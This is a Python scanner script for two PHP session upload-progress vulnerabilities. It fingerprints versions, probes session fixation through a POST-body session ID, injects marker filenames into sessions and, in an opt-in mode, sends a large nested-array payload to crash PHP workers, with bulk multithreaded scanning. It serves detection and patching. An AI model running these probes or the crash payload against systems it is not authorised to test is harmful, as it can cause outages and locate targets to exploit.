#!/usr/bin/env python3
"""
php2shell Scanner — CVE-2026-109618 / CVE-2026-109619 Vulnerability Check

4-tier progressive detection:
  1. Version fingerprint (passive)
  2. upload_progress reachability probe (low risk)
  3. Session write verification (low risk)
  4. OOM differential (opt-in --active, destructive)

Zero external dependencies — stdlib only.

Author: Qi Deng (@ikow)
"""

import argparse
import json
import os
import re
import socket
import ssl
import sys
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ── Patched version boundaries ──────────────────────────────────────────────
# Versions >= these are patched for CVE-2026-109618/109619
PATCHED_VERSIONS = {
    (8, 2): (8, 2, 35),
    (8, 3): (8, 3, 36),
    (8, 4): (8, 4, 27),
    (8, 5): (8, 5, 12),
}
# session.upload_progress introduced in 5.4.0
VULN_FLOOR = (5, 4, 0)


# ════════════════════════════════════════════════════════════════════════════
#  HTTP layer — raw sockets, no deps
# ════════════════════════════════════════════════════════════════════════════

def _connect(host, port, tls=False, timeout=10):
    raw = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=host)
    return raw


def _recv_all(sock, timeout=10):
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            chunks.append(d)
        except (socket.timeout, ConnectionResetError, ssl.SSLError, OSError):
            break
    return b"".join(chunks)


def _parse_response(raw):
    """Parse raw HTTP response into (status_code, headers_dict, body_bytes)."""
    if not raw:
        return 0, {}, b""
    if b"\r\n\r\n" in raw:
        head, body = raw.split(b"\r\n\r\n", 1)
    else:
        head, body = raw, b""
    lines = head.split(b"\r\n")
    status_line = lines[0].decode("latin-1", "replace") if lines else ""
    m = re.match(r"HTTP/\d\.\d\s+(\d+)", status_line)
    status = int(m.group(1)) if m else 0
    headers = {}
    for line in lines[1:]:
        decoded = line.decode("latin-1", "replace")
        if ":" in decoded:
            k, v = decoded.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers, body


def http_request(host, port, method, path, headers=None, body=None,
                 tls=False, timeout=10):
    """Send an HTTP/1.1 request and return (status, headers_dict, body)."""
    hdrs = {"Host": host, "Connection": "close"}
    if headers:
        hdrs.update(headers)
    if body:
        hdrs["Content-Length"] = str(len(body))
    req = f"{method} {path} HTTP/1.1\r\n"
    for k, v in hdrs.items():
        req += f"{k}: {v}\r\n"
    req += "\r\n"
    raw_req = req.encode("latin-1")
    if body:
        raw_req += body if isinstance(body, bytes) else body.encode("latin-1")
    try:
        sock = _connect(host, port, tls=tls, timeout=timeout)
        sock.sendall(raw_req)
        raw_resp = _recv_all(sock, timeout=timeout)
        sock.close()
        return _parse_response(raw_resp)
    except (socket.error, ssl.SSLError, OSError) as e:
        return 0, {}, str(e).encode()


def parse_target(url):
    """Parse URL into (host, port, tls, path)."""
    u = urlparse(url if "://" in url else f"http://{url}")
    tls = u.scheme == "https"
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if tls else 80)
    path = u.path or "/"
    return host, port, tls, path


# ════════════════════════════════════════════════════════════════════════════
#  Version utilities
# ════════════════════════════════════════════════════════════════════════════

def parse_version(ver_str):
    """'8.2.34' → (8, 2, 34) or None."""
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", ver_str)
    return tuple(int(x) for x in m.groups()) if m else None


def is_vulnerable(ver_tuple):
    """Check if a parsed version tuple is vulnerable."""
    if ver_tuple < VULN_FLOOR:
        return False
    branch = ver_tuple[:2]
    patched = PATCHED_VERSIONS.get(branch)
    if patched is None:
        # EOL branch (5.x, 7.x, 8.0, 8.1) — no fix exists
        return True
    return ver_tuple < patched


def version_recommendation(ver_tuple):
    """Return upgrade recommendation string."""
    if ver_tuple is None:
        return "Unable to determine version — manual check required"
    branch = ver_tuple[:2]
    patched = PATCHED_VERSIONS.get(branch)
    if patched is None:
        return f"PHP {'.'.join(map(str, ver_tuple))} is EOL — upgrade to a supported branch (8.2.35+, 8.3.36+, 8.4.27+)"
    if ver_tuple < patched:
        return f"Upgrade to PHP {'.'.join(map(str, patched))}+"
    return "Version is patched"


# ════════════════════════════════════════════════════════════════════════════
#  Tier 1: Version Fingerprint
# ════════════════════════════════════════════════════════════════════════════

def check_version(host, port, path, tls, timeout=10):
    """Passive version detection from HTTP headers."""
    result = {"version": None, "sapi": None, "vulnerable": None, "source": None}
    status, headers, body = http_request(host, port, "GET", path, tls=tls, timeout=timeout)
    if status == 0:
        result["source"] = "connection_failed"
        return result

    # X-Powered-By: PHP/8.2.34
    xpb = headers.get("x-powered-by", "")
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb)
    if m:
        result["version"] = m.group(1)
        result["source"] = "x-powered-by"
        result["sapi"] = "fpm" if "apache" not in headers.get("server", "").lower() else "mod_php"

    # Server: Apache/2.4.x (Debian) PHP/8.2.34
    server = headers.get("server", "")
    sm = re.search(r"PHP/(\d+\.\d+\.\d+)", server)
    if sm:
        result["version"] = sm.group(1)
        result["source"] = "server-header"
        result["sapi"] = "mod_php"

    # SAPI refinement from Server header
    if result["sapi"] is None:
        sl = server.lower()
        if "apache" in sl:
            result["sapi"] = "mod_php"
        elif "nginx" in sl:
            result["sapi"] = "fpm"

    # Check body for PHP version in error output
    if result["version"] is None and body:
        bm = re.search(rb"PHP/(\d+\.\d+\.\d+)", body)
        if bm:
            result["version"] = bm.group(1).decode()
            result["source"] = "body"

    if result["version"]:
        vt = parse_version(result["version"])
        if vt:
            result["vulnerable"] = is_vulnerable(vt)

    return result


# ════════════════════════════════════════════════════════════════════════════
#  Tier 2: upload_progress Reachability
# ════════════════════════════════════════════════════════════════════════════

def check_upload_progress(host, port, path, tls, timeout=10):
    """Probe whether session.upload_progress processes our request."""
    result = {"reachable": False, "session_fixation": False, "details": ""}
    boundary = "SCANBOUND" + uuid.uuid4().hex[:8]

    # Probe 1: multipart POST WITHOUT cookie — if endpoint calls session_start(),
    # the rfc1867 upload_progress handler will have processed our request and
    # we get a Set-Cookie back.
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"scancheck\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="test.txt"\r\n\r\n'
        f"X\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    hdrs = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    status, resp_headers, resp_body = http_request(
        host, port, "POST", path, headers=hdrs, body=body, tls=tls, timeout=timeout)

    if status == 0:
        result["details"] = "connection failed"
        return result

    set_cookie = resp_headers.get("set-cookie", "")
    if "PHPSESSID" in set_cookie:
        result["reachable"] = True
        result["details"] = "upload_progress handler active (session created on multipart POST)"
    elif status in (200, 302, 301):
        result["details"] = f"HTTP {status} but no session cookie — endpoint may not call session_start()"
    else:
        result["details"] = f"HTTP {status}"

    # Probe 2: session fixation via POST body (CVE-2026-109619)
    # The rfc1867 handler accepts PHPSESSID from the POST body, bypassing use_only_cookies.
    sid2 = "fixcheck" + uuid.uuid4().hex[:16]
    body2 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        f"{sid2}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"scancheck\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="test.txt"\r\n\r\n'
        f"X\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")
    hdrs2 = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    status2, resp_headers2, _ = http_request(
        host, port, "POST", path, headers=hdrs2, body=body2, tls=tls, timeout=timeout)
    sc2 = resp_headers2.get("set-cookie", "")
    if sid2 in sc2:
        result["reachable"] = True
        result["session_fixation"] = True
        result["details"] = "session fixation via POST body confirmed (pre-PR#22113)"
    elif "PHPSESSID" in sc2 and result["reachable"]:
        # Server started a session but assigned its own SID (use_only_cookies=On, fixation blocked)
        result["details"] += " (session fixation blocked — use_only_cookies may be On)"

    return result


# ════════════════════════════════════════════════════════════════════════════
#  Tier 3: Session Write Verification
# ════════════════════════════════════════════════════════════════════════════

def check_session_write(host, port, path, tls, timeout=10):
    """Verify that filenames are stored raw in session (injection primitive)."""
    result = {"injectable": False, "details": ""}
    marker = "___PHP2SHELL_PROBE_" + uuid.uuid4().hex[:8] + "___"
    sid = "writecheck" + uuid.uuid4().hex[:16]
    boundary = "WRITEBOUND" + uuid.uuid4().hex[:8]

    # Step 1: inject marker via filename
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"x\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{marker}"\r\n\r\n'
        f"Z\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    hdrs = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Cookie": f"PHPSESSID={sid}",
    }

    status, _, _ = http_request(
        host, port, "POST", path, headers=hdrs, body=body, tls=tls, timeout=timeout)
    if status == 0:
        result["details"] = "injection request failed"
        return result

    # Step 2: read back session via GET with same SID
    status2, _, resp_body = http_request(
        host, port, "GET", path, headers={"Cookie": f"PHPSESSID={sid}"},
        tls=tls, timeout=timeout)

    if marker.encode() in resp_body:
        result["injectable"] = True
        result["details"] = "raw filename found in session response — injection primitive confirmed"
    else:
        # The marker may not appear in the HTTP response even if it's in the session file,
        # because most endpoints don't dump session contents. This is expected.
        result["details"] = "marker not reflected in response (expected unless endpoint dumps session)"

    return result


# ════════════════════════════════════════════════════════════════════════════
#  Tier 4: OOM Differential (opt-in)
# ════════════════════════════════════════════════════════════════════════════

def check_oom(host, port, path, tls, timeout=15):
    """
    Send oversized multipart to trigger memory_limit.
    DESTRUCTIVE — may crash PHP workers.

    Detection logic:
      - Patched PHP: returns error gracefully (soft OOM) or kills worker cleanly (_exit 137)
      - Unpatched mod_php: stale EG() → crash → connection reset or garbled response
      - Unpatched FPM: 502 from upstream, worker death
    """
    result = {"vulnerable": None, "behavior": "", "details": ""}

    # Baseline: normal GET
    base_status, base_headers, _ = http_request(
        host, port, "GET", path, tls=tls, timeout=timeout)
    if base_status == 0:
        result["details"] = "baseline request failed"
        return result

    # OOM probe: ~2MB of deeply nested array keys
    boundary = "OOMPROBE"
    # Build nested array keys: a[b][c][d]... × 60 levels, repeated to fill ~2MB
    nested_key = "a" + "[x]" * 60
    parts = []
    for i in range(800):
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{nested_key}{i}"\r\n\r\n'
            f"{'A' * 2048}\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    oom_body = "".join(parts).encode("latin-1")

    hdrs = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    oom_status, oom_headers, oom_body_resp = http_request(
        host, port, "POST", path, headers=hdrs, body=oom_body, tls=tls, timeout=timeout)

    # Analyze the response
    if oom_status == 0:
        # Connection reset / no response — strong crash signal
        result["vulnerable"] = True
        result["behavior"] = "connection_reset"
        result["details"] = "OOM probe caused connection reset — unpatched crash behavior"
    elif oom_status == 502:
        # 502 Bad Gateway — FPM worker died
        result["vulnerable"] = True
        result["behavior"] = "502_gateway"
        result["details"] = "OOM probe caused 502 — FPM worker crash (unpatched)"
    elif oom_status == 500:
        body_text = oom_body_resp.decode("latin-1", "replace")
        if "Allowed memory size" in body_text:
            # PHP reported OOM gracefully — could be patched (soft OOM) or unpatched
            # Patched PHP uses delayed OOM which produces a clean error page
            # Unpatched may also produce this if memory_limit is hit in userland
            result["behavior"] = "memory_error_500"
            result["details"] = "OOM error returned — may be patched (soft OOM) or unpatched"
        elif len(oom_body_resp) == 0:
            # Empty 500 — strong crash signal (unpatched)
            result["vulnerable"] = True
            result["behavior"] = "empty_500"
            result["details"] = "Empty HTTP 500 — worker crash without error output (unpatched)"
        else:
            result["behavior"] = "nonempty_500"
            result["details"] = f"HTTP 500 with {len(oom_body_resp)}B body"
    elif oom_status == base_status:
        result["behavior"] = "normal_response"
        result["details"] = f"OOM probe returned HTTP {oom_status} same as baseline — memory_limit not reached or post_max_size blocked"
    else:
        result["behavior"] = f"http_{oom_status}"
        result["details"] = f"OOM probe returned HTTP {oom_status}"

    # Post-OOM: check if the worker is still alive
    post_status, _, _ = http_request(host, port, "GET", path, tls=tls, timeout=timeout)
    if post_status == 0 and base_status > 0:
        result["vulnerable"] = True
        result["details"] += " + worker did not recover"
    elif post_status == 502 and base_status != 502:
        result["vulnerable"] = True
        result["details"] += " + subsequent request got 502 (worker dead)"

    return result


# ════════════════════════════════════════════════════════════════════════════
#  Orchestrator
# ════════════════════════════════════════════════════════════════════════════

def scan(url, active=False, path=None, timeout=10):
    """Run all applicable tiers and return a verdict."""
    host, port, tls, url_path = parse_target(url)
    if path:
        url_path = path

    result = {
        "target": url,
        "host": host,
        "port": port,
        "tls": tls,
        "path": url_path,
        "verdict": "UNKNOWN",
        "confidence": "LOW",
        "version": None,
        "sapi": None,
        "checks": {},
        "chains": [],
        "recommendation": "",
        "error": None,
    }

    # Tier 1: Version
    try:
        v = check_version(host, port, url_path, tls, timeout=timeout)
        result["checks"]["version"] = v
        result["version"] = v["version"]
        result["sapi"] = v["sapi"]
    except Exception as e:
        result["checks"]["version"] = {"error": str(e)}

    # Tier 2: upload_progress
    try:
        up = check_upload_progress(host, port, url_path, tls, timeout=timeout)
        result["checks"]["upload_progress"] = up
    except Exception as e:
        result["checks"]["upload_progress"] = {"error": str(e)}

    # Tier 3: Session write (only if upload_progress is reachable)
    up_result = result["checks"].get("upload_progress", {})
    if up_result.get("reachable"):
        try:
            sw = check_session_write(host, port, url_path, tls, timeout=timeout)
            result["checks"]["session_write"] = sw
        except Exception as e:
            result["checks"]["session_write"] = {"error": str(e)}

    # Tier 4: OOM (only with --active)
    if active:
        try:
            oom = check_oom(host, port, url_path, tls, timeout=max(timeout, 15))
            result["checks"]["oom"] = oom
        except Exception as e:
            result["checks"]["oom"] = {"error": str(e)}

    # ── Verdict ──
    ver = result["checks"].get("version", {})
    up = result["checks"].get("upload_progress", {})
    oom = result["checks"].get("oom", {})

    ver_vuln = ver.get("vulnerable")
    up_reachable = up.get("reachable", False)
    oom_vuln = oom.get("vulnerable")

    if oom_vuln is True:
        result["verdict"] = "VULNERABLE"
        result["confidence"] = "HIGH"
    elif ver_vuln is True and up_reachable:
        result["verdict"] = "VULNERABLE"
        result["confidence"] = "HIGH"
    elif ver_vuln is True:
        result["verdict"] = "VULNERABLE"
        result["confidence"] = "MEDIUM"
    elif ver_vuln is False and not oom_vuln:
        result["verdict"] = "PATCHED"
        result["confidence"] = "HIGH" if up_reachable else "MEDIUM"
    elif up_reachable and ver_vuln is None:
        result["verdict"] = "LIKELY_VULNERABLE"
        result["confidence"] = "MEDIUM"
    elif ver.get("source") == "connection_failed":
        result["verdict"] = "ERROR"
        result["error"] = "connection failed"
    else:
        result["verdict"] = "UNKNOWN"
        result["confidence"] = "LOW"

    # ── Applicable chains ──
    sapi = result["sapi"]
    if result["verdict"] in ("VULNERABLE", "LIKELY_VULNERABLE"):
        result["chains"].append("A")  # session injection + LFI (always if upload_progress works)
        result["chains"].append("B")  # var_destroy UAF
        if sapi == "fpm":
            result["chains"].append("C")  # handler mismatch (FPM only)
        if sapi == "mod_php":
            result["chains"].append("D")  # OOM on mod_php
        if sapi == "fpm":
            result["chains"].append("E")  # stale BG across FPM requests
        if sapi is None:
            result["chains"] = ["A", "B", "C", "D", "E"]

    # ── Recommendation ──
    vt = parse_version(result["version"]) if result["version"] else None
    result["recommendation"] = version_recommendation(vt)

    return result


# ════════════════════════════════════════════════════════════════════════════
#  Output formatters
# ════════════════════════════════════════════════════════════════════════════

# ANSI colors
_RED = "\033[91m"
_GRN = "\033[92m"
_YLW = "\033[93m"
_CYN = "\033[96m"
_DIM = "\033[2m"
_RST = "\033[0m"
_BLD = "\033[1m"

VERDICT_COLORS = {
    "VULNERABLE": _RED,
    "LIKELY_VULNERABLE": _YLW,
    "PATCHED": _GRN,
    "UNKNOWN": _DIM,
    "ERROR": _RED,
}


def _color(text, color):
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{_RST}"


def format_text(r):
    """Human-readable single-target output."""
    lines = []
    vc = VERDICT_COLORS.get(r["verdict"], "")

    # Header
    lines.append(_color(f"[*] {r['target']}", _BLD))

    # Version + SAPI
    ver_str = r["version"] or "unknown"
    sapi_str = r["sapi"] or "unknown"
    src = r["checks"].get("version", {}).get("source", "")
    if src:
        ver_str += f" ({src})"
    lines.append(f"    PHP {ver_str} | SAPI: {sapi_str}")

    # Tier 2: upload_progress
    up = r["checks"].get("upload_progress", {})
    if up:
        reachable = "reachable" if up.get("reachable") else "not reachable"
        fixation = " | session fixation: yes" if up.get("session_fixation") else ""
        lines.append(f"    upload_progress: {reachable}{fixation}")

    # Tier 3: session write
    sw = r["checks"].get("session_write", {})
    if sw:
        if sw.get("injectable"):
            lines.append(f"    session write: " + _color("injection confirmed", _RED))
        elif "error" not in sw:
            lines.append(f"    session write: {sw.get('details', 'not tested')}")

    # Tier 4: OOM
    oom = r["checks"].get("oom", {})
    if oom:
        if oom.get("vulnerable"):
            lines.append(f"    OOM probe: " + _color("crash confirmed", _RED))
        elif oom.get("behavior"):
            lines.append(f"    OOM probe: {oom['behavior']}")

    # Verdict
    lines.append("")
    verdict_str = _color(f"    Verdict: {r['verdict']} ({r['confidence']})", vc)
    lines.append(verdict_str)

    # Chains
    if r["chains"]:
        lines.append(f"    Chains: {', '.join(r['chains'])}")

    # Recommendation
    if r["recommendation"]:
        lines.append(f"    {r['recommendation']}")

    # Error
    if r.get("error"):
        lines.append(f"    Error: {r['error']}")

    return "\n".join(lines)


def format_json(r):
    """Machine-readable JSON output."""
    return json.dumps(r, indent=2, default=str)


# ════════════════════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(
        description="php2shell Scanner — CVE-2026-109618 / CVE-2026-109619",
        epilog="By the CVE authors. https://github.com/ikow/php2shell-poc",
    )
    ap.add_argument("target", nargs="?", help="Target URL (http:// or https://)")
    ap.add_argument("--targets", "-f", metavar="FILE",
                    help="File with one URL per line")
    ap.add_argument("--path", "-p", default=None,
                    help="Override endpoint path (default: from URL or /)")
    ap.add_argument("--active", action="store_true",
                    help="Enable OOM differential probe (DESTRUCTIVE — may crash workers)")
    ap.add_argument("--json", "-j", action="store_true",
                    help="JSON output")
    ap.add_argument("--threads", "-t", type=int, default=10,
                    help="Concurrent scan threads (default: 10)")
    ap.add_argument("--timeout", type=int, default=10,
                    help="Per-request timeout in seconds (default: 10)")
    ap.add_argument("--quiet", "-q", action="store_true",
                    help="Only show vulnerable targets")
    args = ap.parse_args()

    if not args.target and not args.targets:
        ap.error("Provide a target URL or --targets file")

    # Collect targets
    targets = []
    if args.target:
        targets.append(args.target)
    if args.targets:
        path = args.targets
        if path == "-":
            lines = sys.stdin.read().splitlines()
        else:
            with open(path) as f:
                lines = f.read().splitlines()
        targets.extend(line.strip() for line in lines if line.strip() and not line.startswith("#"))

    # Deduplicate
    seen = set()
    unique = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            unique.append(t)
    targets = unique

    if not targets:
        ap.error("No targets to scan")

    if args.active:
        print(_color("[!] Active mode: OOM probes WILL be sent. This may crash PHP workers.", _YLW),
              file=sys.stderr)

    # Scan
    results = []
    if len(targets) == 1:
        r = scan(targets[0], active=args.active, path=args.path, timeout=args.timeout)
        results.append(r)
    else:
        def _scan(url):
            return scan(url, active=args.active, path=args.path, timeout=args.timeout)

        total = len(targets)
        done = 0
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {pool.submit(_scan, t): t for t in targets}
            for f in as_completed(futures):
                done += 1
                r = f.result()
                results.append(r)
                if not args.json:
                    print(f"\r[{done}/{total}] ", end="", file=sys.stderr, flush=True)
        if not args.json:
            print(file=sys.stderr)

    # Output
    if args.json:
        if len(results) == 1:
            print(format_json(results[0]))
        else:
            print(json.dumps(results, indent=2, default=str))
    else:
        for r in results:
            if args.quiet and r["verdict"] not in ("VULNERABLE", "LIKELY_VULNERABLE"):
                continue
            print(format_text(r))
            print()

    # Exit code: 0 if any vulnerable found, 1 if all patched, 2 otherwise
    verdicts = {r["verdict"] for r in results}
    if verdicts & {"VULNERABLE", "LIKELY_VULNERABLE"}:
        return 0
    if verdicts == {"PATCHED"}:
        return 1
    return 2


if __name__ == "__main__":
    sys.exit(main())
